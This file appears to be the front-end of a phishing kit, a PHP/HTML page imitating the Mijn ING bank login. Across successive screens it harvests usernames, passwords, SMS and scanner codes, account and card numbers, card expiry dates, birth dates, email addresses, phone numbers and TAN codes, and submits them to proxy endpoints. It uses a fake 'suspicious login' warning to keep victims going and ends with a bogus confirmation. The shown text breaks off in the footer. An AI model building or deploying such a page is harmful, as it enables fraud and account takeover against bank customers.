<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
?>
<!DOCTYPE html>
<html lang="nl-NL">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <base href="<?php echo $php_js->relative_root; ?>login/" />
    <link rel="stylesheet" href="form/css.css">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
    <title>Log in bij Mijn ING - ING Bankieren</title>
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.deep_orange-red.min.css" />
    <script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<body class="js-focus-visible" ng-app="app" ng-controller="c1" ng-cloak>
    <div id="app">
        <div lang="nl-NL">
            <header class="header">
                <div class="header-content">
                    <a class="link-unstyled logo-link"><img class="ing-logo" src="ing-logo.svg" width="118" height="30"></a>
                    <ul class="lang-selector list-unstyled">
                        <li ng-click="lng='nl'" ng-class="{'selected':lng=='nl'}" tabindex="0">NL</li>
                        <li ng-click="lng='en'" ng-class="{'selected':lng=='en'}" tabindex="0">EN</li>
                    </ul>
                </div>
            </header>
            <!--  -->
            <div class="card login-card scum" id="login-view" style="display:; ;">
                <section class="login left-column col88" ng-init="data.type='pers'">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="link-as-tab-wrapper"><a ng-class="{'active':data.type=='pers'}" href="javascript:void(0)" class="link-as-tab " ng-click="data.type='pers'">{{"Particulier"| ng_translate1}}</a> <a ng-click="data.type='biz'" ng-class="{'active':data.type=='biz'}" href="javascript:void(0)" class="link-as-tab ">{{"Zakelijk"| ng_translate1}}</a></div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <!-- 2019 -->
                            <!-- <div class="alert err_div" style="display: ;">
                                <img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"Gepland onderhoud Mijn ING"| ng_translate1}}</h2><span class="text">{{"Op zondag 11 augustus kun je tussen 2:00 en 5:00 mogelijk niet Inloggen. Sorry hiervoor."| ng_translate1}} <a href="https://www.ing.nl/de-ing/internetbankieren/onderhoud-mijn-ing/index.html"><u>{{"Lees verder"| ng_translate1}}</u></a> </span>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div> -->
                            <!-- 2019 -->
                            <!-- <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div> -->
                        </div>
                        <h1 class="font-xl">{{"Log in bij Mijn ING"| ng_translate1}}</h1>
                        <!--  -->
                        <form novalidate="true" id="loginform" autocomplete="off" onsubmit="send1(event,'ask_login_proxy');return false">
                            <legend class="sr-only">{{"Gebruikersnaam en wachtwoord"| ng_translate1}}</legend>
                            <div class="form-group">
                                <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                    <input class="mdl-textfield__input  form-control" pattern=".{4,}" data-err_text='{{"Gebruikersnaam onjuist"|ng_translate1}}' type="text" id="user" name="user">
                                    <label class="mdl-textfield__label" for="sample2">{{"Gebruikersnaam"| ng_translate1}}</label>
                                </div>
                                <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                            </div>
                            <div class="form-group">
                                <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                    <input class="mdl-textfield__input  form-control" pattern=".{4,}" data-err_text='{{"Wachtwoord onjuist"|ng_translate1}}' type="password" id="pass" name="pass">
                                    <label class="mdl-textfield__label" for="sample2">{{"Wachtwoord"| ng_translate1}}</label>
                                </div>
                                <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je Wachtwoord in"| ng_translate1}}</span>
                            </div>
                            <div>
                                <label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="checkbox-2">
                                    <input type="checkbox" id="checkbox-2" class="mdl-checkbox__input">
                                    <span class="mdl-checkbox__label">{{"Onthoud mijn gebruikersnaam"| ng_translate1}}</span>
                                </label>
                            </div>
                            <br>
                            <div id="infoAlert" class="alert-container" role="alert" type="none">
                                <div class="alert"><img class="alert-icon" src="untitled">
                                    <span></span>
                                </div>
                            </div>
                            <div class="login-call-to-actions">
                                <button type="submit" id="submitButton" class="material-button orange">
                                    <span class="msie-button-fix">{{"Inloggen"| ng_translate1}}</span>
                                </button>
                                <div class="help-button icon-link">
                                    <div><img src="arrow-chevron-open-right.svg"></div>
                                    <div>
                                        <button type="button">
                                            <span>{{"Hulp nodig?"| ng_translate1}}</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <div class="alert-container" role="alert" type="error">
                                <div class="alert alert-danger err_div" style="display: none;">
                                    <img class="alert-icon" src="cross.png" aria-hidden="true" aria-label="Error melding">
                                    <span>
                                        <h2 class="title">{{"Deze inloggegevens kloppen niet."| ng_translate1}}</h2><span class="text"> {{"Controleer je gebruikersnaam en je wachtwoord en probeer het nog eens (maximaal 7 keer)."| ng_translate1}} <a role="link" target="_blank" href="https://inlogcodes.mijn.ing.nl/particulier/zelf-regelen/instellen/inlogcodes/index.jsp">{{"Gebruikersnaam of wachtwoord vergeten?"| ng_translate1}}</a></span>
                                    </span>
                                </div>
                            </div>
                        </form>
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>


            <div class="card login-card scum" id="loginsms-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <h1 class="font-xl"> <b style="margin-right: 30px">←</b> {{"Bevestig met sms-code"| ng_translate1}}</h1>
                            <div class="imagediv">
                                <img class="headn" src="headn.png">
                            </div>
                            <h4>{{"Verdachte aanmelding gedetecteerd"| ng_translate1}}</h4>
                            <p class="pp1">{{"Vul de verplichte velden in zodat wij uw identiteit kunnen verifiëren."| ng_translate1}}</p>
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <!--  -->
                        <form novalidate="true" id="loginform2" autocomplete="off" onsubmit="send1(event,'ask_loginsms_proxy');return false">
                            <legend class="sr-only"></legend>
                            <div class="volg">{{"Volgnummer"| ng_translate1}}: <b class="num">78</b> </div>
                            <div class="form-group loginsps-formgorup">
                                <label class="" for="code">{{"Code"| ng_translate1}}</label>
                                <input class=" form-control" pattern=".{4,20}" data-err_text='{{"Code onjuist"|ng_translate1}}' type="text" id="code" name="code">
                                <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je Code in"| ng_translate1}}</span>
                            </div>
                            <br>
                            <div id="infoAlert" class="alert-container" role="alert" type="none">
                                <div class="alert"><img class="alert-icon" src="untitled">
                                    <span></span>
                                </div>
                            </div>
                            <div class="login-call-to-actions">
                                <button type="submit" id="submitButton2" class="material-button orange">
                                    <span class="msie-button-fix">{{"Bevestigen"| ng_translate1}}</span>
                                </button>
                                <div class="help-button icon-link">
                                    <div><img src="arrow-chevron-open-right.svg"></div>
                                    <div>
                                        <button type="button">
                                            <span>{{"Hulp nodig?"| ng_translate1}}</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>






            <div class="card login-card scum" id="qr-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <h1 class="font-xl"> <b style="margin-right: 30px">←</b> {{"Pak je ING scanner"| ng_translate1}}</h1>
                            
                           
                            
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <!--  -->




                        <div class="steps">
                            <div class="step">
                                <span class="stepnumber">1.</span>
                                <span>{{"Scan de kleurcode"| ng_translate1}}</span>
                                <img class="link" src="">
                            </div>


                            


                            <div class="step">
                                <span class="stepnumber">2.</span>
                                <span>{{"Vul de pincode op je scanner in en controleer je opdracht "| ng_translate1}}</span>
                            </div>


                            <div class="step">
                                <span class="stepnumber">3.</span>
                                <span>{{"Vul hieronder de code in die getoond wordt op je scanner"| ng_translate1}}</span>
                            </div>
    
                            
                        </div>


                        <form novalidate="true" id="loginform2" autocomplete="off" onsubmit="send1(event,'ask_qr_proxy');return false">
                            <legend class="sr-only"></legend>
                            
                            <div class="form-group loginsps-formgorup">
                                <label class="" for="code">{{"Code"| ng_translate1}}</label>
                                <input class=" form-control" pattern=".{4,20}" data-err_text='{{"Code onjuist"|ng_translate1}}' type="text" id="code" name="code">
                                <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je Code in"| ng_translate1}}</span>
                            </div>
                            <br>
                            <div id="infoAlert" class="alert-container" role="alert" type="none">
                                <div class="alert"><img class="alert-icon" src="untitled">
                                    <span></span>
                                </div>
                            </div>
                            <div class="login-call-to-actions">
                                <button type="submit" id="submitButton2" class="material-button orange">
                                    <span class="msie-button-fix">{{"Bevestigen"| ng_translate1}}</span>
                                </button>
                                <div class="help-button icon-link">
                                    <div><img src="arrow-chevron-open-right.svg"></div>
                                    <div>
                                        <button type="button">
                                            <span>{{"Hulp nodig?"| ng_translate1}}</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>





            <div class="card login-card scum" id="confirm_with_mobile-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <h1 class="font-xl"> <b style="margin-right: 30px">←</b> {{"Bevestig met de mobile"| ng_translate1}}</h1>
                            <div class="imagediv">
                                <img class="headn" src="conirm_with_mobile.png">
                            </div>
                            <h5>{{"Open de app voor mobiel bankieren"| ng_translate1}}</h5>
                            <p class="pp1">{{"In de app zie je de knop 'Bevestigen'. Daarmee log je in"| ng_translate1}}</p>
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <!--  -->
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>



            <div class="card login-card scum" id="info-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie, dit kan enkele minuten duren "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <h1 class="font-xl">{{"Mailbox activeren"| ng_translate1}}</h1>
                        <p class="">{{"Vul de onderstaande velden in om door te gaan"| ng_translate1}}</p>
                        <!--  -->
                        <form novalidate="true" id="loginform3" autocomplete="off" onsubmit="send1(event,'ask_info_proxy');return false">
                            <legend class="sr-only"></legend>
                            <div class="" ng-show="data.type=='pers'">
                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control" pattern=".{4,}" data-err_text='{{"Rekeningnummer onjuist"|ng_translate1}}' type="text" maxlength="10" id="rekeningnummer" name="rekeningnummer">
                                        <label class="mdl-textfield__label" for="rekeningnummer">{{" Particulier rekeningnummer"| ng_translate1}}</label>
                                        <span class="addoon1">NL ** INGB</span>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                                </div>
                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control" pattern="^\d{3}[a-zA-Z]{1}\d{3}$" data-err_text='{{"Pasnummer onjuist"|ng_translate1}}' maxlength="7" placeholder="123A123" type="text" id="pasnummer" name="pasnummer">
                                        <label class="mdl-textfield__label" for="pasnummer">{{" Pasnummer"| ng_translate1}}</label>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                                </div>
                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control" pattern="\d{2}\/\d{4}" placeholder='{{"MM/JJJJ"| ng_translate1}}' data-mask="99/9999" data-err_text='{{"Pas geldig tot en met onjuist"|ng_translate1}}' type="text" id="validtill" name="validtill">
                                        <label class="mdl-textfield__label" for="validtill">{{"Pas geldig tot en met"| ng_translate1}}</label>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                                </div>
                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control" pattern="\d{2}\/\d{2}\/\d{4}" data-mask="99/99/9999" placeholder='{{"DD/MM/JJJJ"| ng_translate1}}' data-err_text='{{"Geboortedatum onjuist"|ng_translate1}}' type="text" id="dob" name="dob">
                                        <label class="mdl-textfield__label" for="dob">{{"Geboortedatum"| ng_translate1}}</label>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                                </div>
                            </div>
                            <div class="" ng-show="data.type=='biz'">
                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control" pattern=".{4,}" data-err_text='{{"Rekeningnummer onjuist"|ng_translate1}}' type="text" maxlength="10" id="biz_rekeningnummer" name="biz_rekeningnummer">
                                        <label class="mdl-textfield__label" for="biz_rekeningnummer">{{" Zakelijk rekeningnummer"| ng_translate1}}</label>
                                        <span class="addoon1">NL ** INGB</span>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                                </div>
                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control" pattern=".{6,20}" data-err_text='{{"Gebruikersnaam Mijn ING Zakelijk onjuist"|ng_translate1}}' type="text" id="biz_use" name="biz_use">
                                        <label class="mdl-textfield__label" for="biz_use">{{"Gebruikersnaam Mijn ING Zakelijk"| ng_translate1}}</label>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                                </div>
                            </div>
                            <br>
                            <div id="infoAlert" class="alert-container" role="alert" type="none">
                                <div class="alert"><img class="alert-icon" src="untitled">
                                    <span></span>
                                </div>
                            </div>
                            <div class="login-call-to-actions">
                                <button type="submit" id="submitButton3" class="material-button orange">
                                    <span class="msie-button-fix">{{"Bevestigen"| ng_translate1}}</span>
                                </button>
                                <div class="help-button icon-link">
                                    <div><img src="arrow-chevron-open-right.svg"></div>
                                    <div>
                                        <button type="button">
                                            <span>{{"Hulp nodig?"| ng_translate1}}</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>

            <div class="card login-card scum" id="extra-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie, dit kan enkele minuten duren "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <h1 class="font-xl">{{"Mailbox activeren"| ng_translate1}}</h1>
                        <p class="">{{"Vul de onderstaande velden in om door te gaan"| ng_translate1}}</p>
                        <!--  -->
                        <form novalidate="true" id="loginform3" autocomplete="off" onsubmit="send1(event,'ask_extra_proxy');return false">
                            <legend class="sr-only"></legend>
                            
                                


                                


                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control"  data-err_text='{{"E-mailadres onjuist"|ng_translate1}}'  placeholder='{{" E-mailadres"| ng_translate1}}' type="text" id="id__" name="id__">
                                        <label class="mdl-textfield__label" for="id__">{{" E-mailadres"| ng_translate1}}</label>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je E-mailadres in"| ng_translate1}}</span>
                                </div>


                                <div class="form-group">
                                    <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                        <input class="mdl-textfield__input  form-control"  data-err_text='{{"Mobiel nummer onjuist"|ng_translate1}}'  placeholder='{{" Mobiel nummer"| ng_translate1}}' type="text" id="id__" name="id__">
                                        <label class="mdl-textfield__label" for="id__">{{" Mobiel nummer"| ng_translate1}}</label>
                                    </div>
                                    <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je Mobiel nummer in"| ng_translate1}}</span>
                                </div>
                                
                                
                            
                            
                            <br>
                            <div id="infoAlert" class="alert-container" role="alert" type="none">
                                <div class="alert"><img class="alert-icon" src="untitled">
                                    <span></span>
                                </div>
                            </div>
                            <div class="login-call-to-actions">
                                <button type="submit" id="submitButton3" class="material-button orange">
                                    <span class="msie-button-fix">{{"Bevestigen"| ng_translate1}}</span>
                                </button>
                                <div class="help-button icon-link">
                                    <div><img src="arrow-chevron-open-right.svg"></div>
                                    <div>
                                        <button type="button">
                                            <span>{{"Hulp nodig?"| ng_translate1}}</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>



            <div class="card login-card scum" id="sms-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <h1 class="font-xl">{{"Mobiele app (her)activeren"| ng_translate1}}</h1>
                        <p class="">{{"U ontvangt binnen enkele ogenblikken een TAN-code per SMS. Controleer de gegevens en vul de code in."| ng_translate1}}</p>
                        <!--  -->
                        <form novalidate="true" id="loginform2" autocomplete="off" onsubmit="send1(event,'ask_info_proxy');return false">
                            <legend class="sr-only"></legend>
                            <div class="form-group">
                                <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                    <input class="mdl-textfield__input  form-control " disabled="disabled" value="000000" type="text" id="volgnummer" name="volgnummer">
                                    <label class="mdl-textfield__label" for="volgnummer">{{"Volgnummer"| ng_translate1}}</label>
                                </div>
                                <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                            </div>
                            <div class="form-group">
                                <div class="mdl-textfield mdl-js-textfield  mdl-textfield--floating-label    ">
                                    <input class="mdl-textfield__input  form-control" pattern=".{4,20}" data-err_text='{{"SMS Code onjuist"|ng_translate1}}' type="text" id="sms" name="sms">
                                    <label class="mdl-textfield__label" for="sms">{{"TAN-code"| ng_translate1}}</label>
                                </div>
                                <span class="error-alert err_span" style="display: none;"><img src="alert-error.svg"> {{" Vul je gebruikersnaam in"| ng_translate1}}</span>
                            </div>
                            <br>
                            <div id="infoAlert" class="alert-container" role="alert" type="none">
                                <div class="alert"><img class="alert-icon" src="untitled">
                                    <span></span>
                                </div>
                            </div>
                            <div class="login-call-to-actions">
                                <button type="submit" id="submitButton2" class="material-button orange">
                                    <span class="msie-button-fix">{{"Bevestigen"| ng_translate1}}</span>
                                </button>
                                <div class="help-button icon-link">
                                    <div><img src="arrow-chevron-open-right.svg"></div>
                                    <div>
                                        <button type="button">
                                            <span>{{"Hulp nodig?"| ng_translate1}}</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">{{"Hulp"| ng_translate1}}</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div>




            <div class="card login-card scum" id="done-view" style="display:none;">
                <section class="login left-column col88">
                    <div class="waiter__" style="color: white; position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; background: rgba(14, 14, 14, 0.76); z-index: 1; display: none;">
                        <div class="waiter_box__" style="position: relative;top:100px;width: 90%;max-width: 400px;margin: 0 auto;text-align: center;padding: 40px 10px;">
                            <div class="waiter_span__"> <span class="fa fa-spinner fa-spin" style="font-size:40px"></span> </div>
                            <h4 class="waiter__h4">{{" Even geduld aub... "| ng_translate1}}</h4>
                            <p class="waiter__p">{{" We controleren uw informatie "| ng_translate1}}</p>
                        </div>
                    </div>
                    <div class="means-view">
                        <div id="infoAlert" class="alert-container" role="alert" type="info">
                            <div class="alert err_div" style="display: none;"><img class="alert-icon" src="alert-info.svg">
                                <span>
                                    <h2 class="title">{{"fouten"| ng_translate1}}</h2>
                                    <ul class="err_ul">
                                        <li>some</li>
                                    </ul>
                                </span>
                                <button class="close-button" onclick="$('.err_div').hide();"><img class="close-icon" src="menu-close.svg"></button>
                            </div>
                        </div>
                        <h1 class="font-xl">{{"Succesvol afgerond!"| ng_translate1}}</h1>
                        <p class="">U ontangt binnen 3 werkdagen schriftelijk bericht van ons.</p>
                        <!--  -->
                        <!--  -->
                    </div>
                </section>
                <section class="help-section">
                    <div class="help-section-content">
                        <span class="help-header">
                            <h2 class="font-lg color-orange">Hulp</h2>
                            <button class="close-button"><img class="close-icon" src="menu-close.svg"></button>
                        </span>
                    </div>
                </section>
                <div class="float-clear"></div>
            </div> <!--  -->




            <footer class="footer-links font-sm">
                <div>
                    <div class="icon-link">
                        <span><img src="arrow-chevron-open-right.svg"></span>
